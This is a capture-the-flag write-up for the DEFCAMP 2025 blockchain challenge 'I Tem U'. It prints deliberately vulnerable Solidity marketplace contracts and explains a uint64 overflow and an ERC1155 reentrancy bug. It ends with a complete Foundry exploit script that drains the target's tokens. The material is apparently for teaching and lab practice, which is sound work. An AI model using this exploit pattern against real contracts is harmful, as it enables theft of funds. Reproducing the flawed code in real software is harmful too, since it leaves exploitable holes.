+++
date = '2025-09-16T08:32:44+05:30'
draft = false
title = 'I Tem U'
categories=["Blockchain"]
series=["DEFCAMP-2025"]
tags=["Overflow","Re-Entrancy"]
+++


### Writeup for I-Tem-U
- Before diving into this writeup, it’s crucial to have a solid understanding of Foundry, a powerful framework for Ethereum smart contract development. Foundry will be your primary tool for writing, testing, and breaking contracts in this guide.

### Challenge Description
dis item very special!! 😍 🩷 it go bling bling in ur pocket!! 💎 TEM SHOP BEST PRICE!!! 💰💰💰 tem go back to college wit da profit 📚.

### Objective

This challenge objective is to make **Tem** balance of `TEM_FAV_ITEM` as 0.

### Source Files

The below are source contracts

1. **iTems** contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import  {Ownable} from "lib/openzeppelin-contracts/contracts/access/Ownable.sol";
import  "lib/openzeppelin-contracts/contracts/token/ERC1155/ERC1155.sol";


library Items {
    uint256 internal constant GOLD = 0;
    uint256 internal constant DAGEROUS_DAGER = 1;
    uint256 internal constant TEM_FAV_ITEM = 2;
}

contract iTems is ERC1155, Ownable {

 
    constructor(address tem,uint amount) ERC1155("") Ownable(msg.sender) {}
    
    // Called on deployment

    /**
    @dev tem happi
    */

    function temHappi(address tem) external onlyOwner{
        _mint(tem, Items.GOLD, 1_000, "");
        _mint(tem, Items.DAGEROUS_DAGER, 4, "");
        _mint(tem, Items.TEM_FAV_ITEM, 10, "");
    }

    /**
    @dev challenge supplier
    */

    function freeGold(address to, uint256 amount) external onlyOwner{
        _mint(to, Items.GOLD, amount, "");
    }
}


```

2. **TemU** contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {IERC1155} from "lib/openzeppelin-contracts/contracts/token/ERC1155/ERC1155.sol";
import {ERC1155Holder} from "lib/openzeppelin-contracts/contracts/token/ERC1155/utils/ERC1155Holder.sol";
import  {Ownable} from "lib/openzeppelin-contracts/contracts/access/Ownable.sol";

import "./iTems.sol";


contract TemU is Ownable,ERC1155Holder {

    struct Listing {
        uint256 id;
        address seller;
        uint256 itemId;
        uint256 quantity;
        uint256 price;
        bool active;
    }

    iTems public token;

    event newListing();
    event itemPurchased(uint256, address,uint256,uint256,uint256);

    uint64 public goldPrice;

    mapping(uint256 => Listing) public listings;
    
    uint256[] public listingsIds;

    constructor(address _token)  Ownable(msg.sender) {
        token = iTems(_token);
        goldPrice = 1_000_000_000;
    }

    function createListing(uint256 item_id, uint256 quantity, uint256 price) external {
        // Basic checks
        require(item_id >=0 && item_id < 3,"Item not found");
        require(quantity > 0, "Quantity must be greater than zero");
        require(price > 0, "Price must be greater than zero");

        uint256 listingId = uint256(keccak256(abi.encodePacked(msg.sender, item_id)));
        for (uint256 i; i < listingsIds.length; i++){
            require(listingsIds[i] != listingId, "Only one per seller per item allowed");
        }

        // Make sure we are allowed to move funds
        require(token.balanceOf(msg.sender, item_id) >= quantity,"Insufficient balance");
        require(token.isApprovedForAll(msg.sender, address(this)),"This marketplace is not approved");

        listings[listingId] = Listing(listingId, msg.sender, item_id, quantity, price,true);
        listingsIds.push(listingId);

        emit newListing();

    }

    function purchaseItem(uint256 listingIdToPurchase, uint256 qunatityToPurchase) external {
        Listing storage listing = listings[listingIdToPurchase];
        // Basic checks
        require(listing.active, "Listing not active");
        require(listing.quantity >= qunatityToPurchase, "Not enough quantity in listing");
        require(qunatityToPurchase > 0, "Quantity must be greater than zero");

        uint256 totalGoldCost = listing.price * qunatityToPurchase;
        require(token.balanceOf(msg.sender, Items.GOLD) >= totalGoldCost, "Insufficient GOLD balance");

        token.safeTransferFrom(listing.seller, msg.sender, listing.itemId, qunatityToPurchase, "");

        // Update listing quantity
        if (listing.quantity > 0) {
            listing.quantity -= qunatityToPurchase;
        }

        if (listing.quantity == 0) {
            listing.active = false;
            uint256 indexToRemove = type(uint256).max;
            for (uint256 i = 0; i < listingsIds.length; i++) {
                if (listingsIds[i] == listingIdToPurchase) {
                    indexToRemove = i;
                    break;
                }
            }
            if (indexToRemove != type(uint256).max && listingsIds.length > 0) {
                listingsIds[indexToRemove] = listingsIds[listingsIds.length - 1];
                listingsIds.pop();
            }
        }

        token.safeTransferFrom(msg.sender, listing.seller, Items.GOLD, totalGoldCost, "");

        emit itemPurchased(listingIdToPurchase, msg.sender, listing.itemId, qunatityToPurchase, totalGoldCost);
    }

    function showListings() external view returns (Listing[] memory){
        Listing[] memory allListings = new Listing[](listingsIds.length);
        for (uint256 i = 0; i < listingsIds.length; i++){
            allListings[i] = listings[listingsIds[i]];
        }

        return allListings;
    }

    function buyGold(uint64 goldToBuy) external payable {
        require(goldToBuy > 0, "Zero gold not allowed");
        require(msg.value > 0, "Zero ether not allowed");

        unchecked { 
            //overflow
            uint64 ethRequired = goldToBuy * goldPrice; 

            require(msg.value >= ethRequired, "Insufficient Ether sent");
            require(token.balanceOf(address(this), Items.GOLD) >= goldToBuy, "Try again later");

            // Refund any excess ETH
            if (msg.value > ethRequired) {
                payable(msg.sender).transfer(msg.value - ethRequired);
            }
        }

        token.safeTransferFrom(address(this), msg.sender, Items.GOLD, goldToBuy, "");

    }
}

```

3. **Tem** contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {IERC1155} from "lib/openzeppelin-contracts/contracts/token/ERC1155/ERC1155.sol";
import {ERC1155Holder} from "lib/openzeppelin-contracts/contracts/token/ERC1155/utils/ERC1155Holder.sol";
import  {Ownable} from "lib/openzeppelin-contracts/contracts/access/Ownable.sol";


import "./TemU.sol";
import "./iTems.sol";

contract Tem is Ownable{

    iTems token;
    TemU marketplace;

    constructor(address _token, address _marketplace) Ownable(msg.sender){
        token = iTems(_token);
        marketplace = TemU(_marketplace);

    }

    function sellTem() external onlyOwner{
        token.setApprovalForAll(address(marketplace), true);
        marketplace.createListing(Items.TEM_FAV_ITEM, 1, 1e10);
    }

    function onERC1155Received(
        address,
        address,
        uint256,
        uint256,
        bytes memory
    ) public virtual  returns (bytes4) {
        return this.onERC1155Received.selector;
    }
}
```

### The challenge

**Breaking Down iTems**

The `iTems` contract inherits the `ERC1155` token standard. `ERC1155` is a multi-token standard that allows for the creation of both fungible and non-fungible tokens. The `iTems` contract has just two functions: `temHappi` and `freeGold`.

The `temHappi` function accepts one address parameter and can only be called by the owner. When called, it mints three types of fungible tokens: `GOLD`, `DAGEROUS_DAGER`, and `TEM_FAV_ITEM`. Specifically, this function mints 1,000 `GOLD` tokens, 4 `DAGEROUS_DAGER` tokens, and 10 `TEM_FAV_ITEM` tokens.

The `freeGold` function accepts two parameters as input, an `address` and an `amount`, and can also only be called by the owner. When called, this function will mint the specified amount of `GOLD` tokens to the address that was passed in.

**Breaking Down TemU**

The `TemU` contract is a marketplace where owners of `GOLD`, `DAGEROUS_DAGER`, and `TEM_FAV_ITEM` tokens can create sell orders, and if someone is interested in buying those tokens, they can. The `TemU` contract has three state-changing functions: `createListing`, `purchaseItem`, and `buyGold`.

The `createListing` function accepts three parameters as input: an `item_id` (uint256), a `quantity` (uint256), and a `price` (uint256). The function makes sure that the `item_id` passed is in the range of [0,3). The `quantity` is the amount of tokens the user wants to sell, and the `price` is the price in terms of the `GOLD` token. This function will make sure that the listing creator has the token with the specified `item_id` and a balance of at least the `quantity`. It will also check that the seller has approved the `TemU` contract to spend tokens on their behalf. Then, it will store all these details about the sell order in a struct named `Listing`. The struct is as follows.



```solidity
struct Listing {
    uint256 id;
    address seller;
    uint256 itemId;
    uint256 quantity;
    uint256 price;
    bool active;
}
```

The `purchaseItem` function accepts two parameters as input: a `listing_id` (uint256) and a `quantityToPurchase` (uint256). The `listing_id` is the ID of the listing, which is derived as `keccak256(listing_creator, token_id)`, and `quantityToPurchase` is the amount of tokens they want to purchase. The intended behavior of this function is to revert if the `quantityToPurchase` exceeds the `quantity` available in the listing. If everything matches, it will transfer the tokens from the `Listing` to the buyer (`msg.sender`) and transfer the required `GOLD` tokens to the seller of that listing.

The `buyGold` function accepts one parameter as input, `goldToBuy` (uint64). This function helps people buy `GOLD` for Ether at a fixed price. The price of `GOLD` is `1,000,000,000` wei. So, if you want to buy `10 GOLD`, you need to send `10 * 1,000,000,000` wei to this contract, and this contract will send `10 GOLD` to you. If the `TemU` contract doesn't have enough balance of `GOLD`, it will revert.

**Breaking Down Tem**

The `Tem` contract is basically a users contract. It has only one state changing function: `sellTem`.

The `sellTem` function can only be called by the owner. Upon calling, it will first approve the marketplace contract to manage its tokens and then create a sell order for `1` `TEM_FAV_ITEM` in the marketplace for a price of `10,000,000,000` GOLD tokens.

### The Vulnerability

Our goal is to make the `Tem` contract's balance of `TEM_FAV_ITEM` zero. During the challenge deployment, `iTems::temHappi` was called, passing the `Tem` contract's address. As a result, the `Tem` contract now has `1,000 GOLD`, `4 DAGEROUS_DAGER`, and `10 TEM_FAV_ITEM`. We need to somehow make the `TEM_FAV_ITEM` balance go from 10 to zero. The deployment script also called the `Tem::sellTem` function, so there is an active listing to sell 1 `TEM_FAV_ITEM` for `10,000,000,000 GOLD`.

If we look at the `ERC1155` token standard, the `setApprovalForAll` function allows a spender to transfer any amount of an owner's tokens until the approval is revoked. This is different from the approve function in the `ERC20` standard. The Tem contract has called `setApprovalForAll`, giving the `TemU` marketplace contract `true` approval.

Because of this full approval, even though the `Tem` contract's listing is for only one token, we can take all 10 `TEM_FAV_ITEM` tokens if we can find a bug in the `TemU` contract. The `TemU::purchaseItem` function does not follow the **Checks-Effects-Interactions (CEI)** pattern. It first transfers the tokens to the buyer and then decreases the quantity of that particular listing.

If this were an `ERC20` transfer, it wouldn't be an issue because the buyer couldn't re-enter the function. However, since it is an `ERC1155` `safeTransferFrom`, the function makes a callback to the receiver's contract by calling `onERC1155Received`. From within this callback function, the buyer can call `TemU::purchaseItem` again. This re-entrant call will succeed because the listing's quantity has not been updated yet, transferring another `TEM_FAV_ITEM`.

If the buyer repeats this 10 times, the `Tem` contract's `TEM_FAV_ITEM` balance will become zero. The problem is that each call requires `1e10 GOLD` tokens, for a total of `10 * 1e10 GOLD`. To buy this much `GOLD` from the `TemU::buyGold` function, we would need `10 * 1e10 * 1e9 wei`, which is `100 ether`. We only have `1 ether`.


```solidity
function buyGold(uint64 goldToBuy) external payable {
        require(goldToBuy > 0, "Zero gold not allowed");
        require(msg.value > 0, "Zero ether not allowed");

        unchecked { 
            //@audit overflow
            uint64 ethRequired = goldToBuy * goldPrice; 

            require(msg.value >= ethRequired, "Insufficient Ether sent");
            require(token.balanceOf(address(this), Items.GOLD) >= goldToBuy, "Try again later");

            // Refund any excess ETH
            if (msg.value > ethRequired) {
                payable(msg.sender).transfer(msg.value - ethRequired);
            }
        }

        token.safeTransferFrom(address(this), msg.sender, Items.GOLD, goldToBuy, "");

    }
```

If we look at the `buyGold` function, we can see that `goldToBuy` is a `uint64` and `goldPrice` is also a `uint64`. `ethRequired` is being calculated as `goldToBuy * goldPrice`, but this calculation is happening in an `unchecked` block, so there is a possibility of an overflow. If we input a high value for `goldToBuy`, it will definitely overflow. However, we can't just input a high value because the function will try to transfer that amount of `goldToBuy` tokens to us at the end. If this transfer fails, the call will revert. Therefore, before passing a high value, we need to make sure the `TemU` contract has enough `GOLD` tokens.

The `TemU` contract has `1e18` GOLD tokens, which is a huge amount and enough to cause a uint64 to overflow. The true result of `1e18 * 1e9` is `1,000,000,000,000,000,000,000,000,000` but as a `uint64` this calculation overflows and results in `11515845246265065472`. This overflowed value is about 11.5 ether, but we only have `1 ether`. We need to do some math to make `goldToBuy * goldPrice` result in a value less than `0.1 ether` after it overflows, while also ensuring goldToBuy is `greater` than 10 * 1e10.

To understand this, let's review how overflows work. The maximum value that can be stored in a uint8 is 2**8 - 1, which is 255.

```solidity

pragma solidity 0.6.12;

contract Overflow{

    function doOverflow(uint8 a,uint8 b)public pure returns(uint8){
        return a*b;
    }
}

```

If we call  `Overflow::doOverflow` by passing `10` and `2`, the result is `20`, as expected. But if we call it by passing `128` and `2`, the result is `0` instead of the expected `256`. Since a `uint8` can only store up to `255`, the value `256` wraps around to zero.


`10` in hex is `0x000000000000000000000000000000000000000000000000000000000000000a`, `2` in hex is `0x0000000000000000000000000000000000000000000000000000000000000002` and `128` in hex is `0x0000000000000000000000000000000000000000000000000000000000000080`

`10` * `2` == `0x000000000000000000000000000000000000000000000000000000000000000a` * `0x0000000000000000000000000000000000000000000000000000000000000002` which will be equal to `0x0000000000000000000000000000000000000000000000000000000000000014`. Since it is uint8 it will return last one byte. so it will return hex(14) which is 20 in decimal

`128` * `2` == `0x0000000000000000000000000000000000000000000000000000000000000080` * `0x0000000000000000000000000000000000000000000000000000000000000002` which will be equal to `0x0000000000000000000000000000000000000000000000000000000000000100`. Since it is uint8 it will return last one byte. so it will return hex(00) which is 0 in decimal. But if we see the whole bytes32 value the value is 256 but since we are using uint8 it is returning only 1 byte

We can also describe this overflow behavior using modular arithmetic. For example, `uint8(128) * uint8(2)` is the same as `(128 * 2) % 256`. If the input is `uint8(130) * uint8(2)`, the output will be `4`, which is equivalent to `(130 * 2) % 256`. We can generalize this as `uint8(x) * uint8(y)` being equal to `(x * y) % 256`.

Assume we have an input `x` of `130` and a constant multiplier `y` of `2`. We need to find a new value for `x` such that `(new_x * 2) % 256` is equal to`0`. The current value of `130` does not work, as `(130 * 2) % 256` is not `0`.

To find the new `x` from the given one, we can use the following formula: `new_x = 130 - ((130 * 2) % 256) / 2`. This new `x` will give a result of zero when multiplied by 2, modulo 256. We can generalize it as `new_x = old_x - ((old_x*y)%2**(number_of_bits))/y`

Now, let's get back to the solution. In our case, the overflow happens with `uint64` values. As we saw, if we try to buy the `TemU` contract's entire `GOLD` balance (`1e18`), the ethRequired after the overflow is still about `11.1 ether`, which is more than the `1 ether` we have.

We can use our generalized formula to find a goldToBuy amount that will cause the ethRequired to overflow to a value that is almost zero. This allows us to buy a massive number of tokens for a tiny price.

The generalized formula is: `new_x = old_x - ((old_x * y) % (2**number_of_bits)) / y`


We can map the variables from the buyGold function to this formula:
- `old_x`: 1e18 (GOLD balance of TemU)
- `y`: The constant price of one GOLD token, which is `1e9`.
- `number_of_bits`: The integer size we are overflowing, which is `64`.

Plugging these values in, the ideal goldToBuy amount (new_x) can be calculated as: `goldToBuy = 1e18 - ((1e18 * 1e9) % (2**64)) / 1e9`

This calculation gives us the largest possible `goldToBuy` value (starting from the contract's balance) that results in an `ethRequired` of less than 0.1 ether. 

### Exploit Script

The below is the exploit script:

```solidity
pragma solidity ^0.8.0;

import {Script,console} from "forge-std/Script.sol";
import {TemU} from "src/TemU.sol";
import {iTems} from "src/iTems.sol";
import {Tem} from "src/Tem.sol";
import {ERC1155Holder} from "lib/openzeppelin-contracts/contracts/token/ERC1155/utils/ERC1155Holder.sol";


contract Solve is Script{
    function run()public{
        vm.startBroadcast();
        TemU market=TemU(address(0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512));
        Exploit exploit=new Exploit(market);
        exploit.pwn{value: 0.1e18}();
        iTems token=market.token();
        require(token.balanceOf(address(exploit), 2)==10);
        vm.stopBroadcast();
    }
}


contract Exploit is ERC1155Holder{

    uint256 price=1e9;
    uint256 balance=1000000000000000000;
    uint256 qunatityToPurchase=1;
    TemU market;
    iTems token;
    uint256 listingIdToPurchase;
    uint8 count=0;
    constructor(TemU _market){
        market=_market;
        token=market.token();
    }

    function pwn()public payable{
        uint256 u_64_max=2**64;
        uint256 init_overflow_amount=(price* balance) %u_64_max;
        uint256 init_buy_amount=balance-(init_overflow_amount/price);
        uint256 eth_to_send= uint64(uint256(init_buy_amount)* uint256(price));
        market.buyGold{value:eth_to_send}(uint64(init_buy_amount));
        balance-=init_buy_amount;
        token.setApprovalForAll(address(market), true);
        listingIdToPurchase=market.listingsIds(0);
        market.purchaseItem(listingIdToPurchase, qunatityToPurchase);

        // Logic to drain Entire GOLD of TemU :)
        /*
        uint256 transfer_value= (u_64_max/uint256(price))- balance +1;
        token.safeTransferFrom(address(this), address(market), 0, transfer_value, "");
        uint256 current_market_balance= token.balanceOf(address(market), 0);
        eth_to_send= uint64(uint256(current_market_balance)* uint256(price));
        market.buyGold{value:eth_to_send}(uint64(current_market_balance));
        console.log(token.balanceOf(address(market), 0));
        */
    }

    function onERC1155Received(
        address,
        address,
        uint256 id,
        uint256,
        bytes memory
    ) public virtual override returns (bytes4) {
        
        if(count<9 && id==2){
            count+=1;
            market.purchaseItem(listingIdToPurchase, qunatityToPurchase);

        }
        
        return this.onERC1155Received.selector;
    }

}
```




### Note
If you want to try this challenge locally, clone the [challenges repository](https://github.com/s4bot3ur/Blockchain-Challenges) and follow the [setup guide](https://github.com/s4bot3ur/Blockchain-Challenges/tree/main/EVM/2025). This setup is available only for 2025 challenge solutions. If you face any issues feel free to reach out on [discord](https://discord.com/users/666925625650446357) :)

To deploy the challenge run the following command.
```bash
make deploy CTF=DEFCAMP-2025 CHALL=I-Tem-U
```
To run my solution run the following command.
```bash
make run-solution CTF=DEFCAMP-2025 CHALL=I-Tem-U
```
To run your solution run the following command. Before running this you need to implement your solution in Solve.s.sol
```bash
make run-solution CTF=DEFCAMP-2025 CHALL=I-Tem-U
```


<p style="text-align:center;">***<strong>Hope you enjoyed this write-up. Keep on hacking and learning!</strong>***</p>